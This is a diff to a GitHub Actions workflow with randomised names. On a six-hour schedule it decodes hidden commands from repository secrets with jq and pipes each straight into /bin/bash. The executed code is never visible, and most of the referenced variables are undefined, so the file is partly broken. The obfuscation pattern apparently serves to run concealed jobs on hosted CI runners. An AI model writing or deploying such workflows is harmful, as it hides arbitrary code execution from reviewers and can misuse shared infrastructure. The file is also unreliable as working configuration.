@@ -3,8 +3,9 @@ name: yzhuoxingchen
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
-jobs:  # 17481
+    - cron: '49 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +13,19 @@ jobs:  # 17481
       - uses: actions/checkout@v4
       - name: yzhuoxingchen
         env:
-          ibyh487: ${{ secrets.ibyh487 }}
+          b03513: ${{ secrets.b03513 }}
         run: |
-          echo $ibyh487 | jq -r .hmxwg85 | /bin/bash
-          echo $ldi89716 | jq -r .kdly44 | /bin/bash
-          echo $tatlb06783 | jq -r .r80250 | /bin/bash
+          echo $b03513 | jq -r .hflaf90039 | /bin/bash
+          echo $hru3 | jq -r .twre830 | /bin/bash
+          echo $w8451 | jq -r .sq108 | /bin/bash
+          echo $w8122 | jq -r .rwrya03 | /bin/bash
+          echo $jl416 | jq -r .pns54 | /bin/bash
+          echo $zuxqa9271 | jq -r .clv1453 | /bin/bash
+          echo $ql6 | jq -r .vl031 | /bin/bash
+          echo $ejkam284 | jq -r .utcr47 | /bin/bash
+          echo $lain3017 | jq -r .pxk82 | /bin/bash
+          echo $zuri0844 | jq -r .jqw72 | /bin/bash
+          echo $evt9013 | jq -r .ufpbp62881 | /bin/bash
+          echo $sa6840 | jq -r .fyl969 | /bin/bash
+          echo $ozlbc1354 | jq -r .n7294 | /bin/bash
 
